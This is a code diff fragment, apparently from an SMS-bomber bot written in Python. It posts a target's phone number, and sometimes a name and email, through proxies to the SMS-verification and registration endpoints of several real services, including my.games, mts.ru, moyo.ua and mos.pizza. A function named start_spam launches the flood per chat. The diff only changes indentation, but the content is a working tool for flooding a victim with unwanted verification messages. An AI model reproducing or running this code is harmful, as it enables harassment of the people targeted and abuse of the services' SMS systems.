 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://www.nl.ua",data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode","phone": phone,"registration": "N"}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://www.niyama.ru/ajax/sendSMS.php",data={"REGISTER[PERSONAL_PHONE]": phone,"code": "","sendsms": "Выслать код"}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://account.my.games/signup_send_sms/", data={"phone": phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://auth.multiplex.ua/login", json={"login": phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://www.moyo.ua/identity/registration",data={"firstname": name,"phone": phone,"email": email}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php",data={"name": name, "phone": phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 
 def start_spam(chat_id, phone_number, force):
 	running_spams_per_chat_id.append(chat_id)
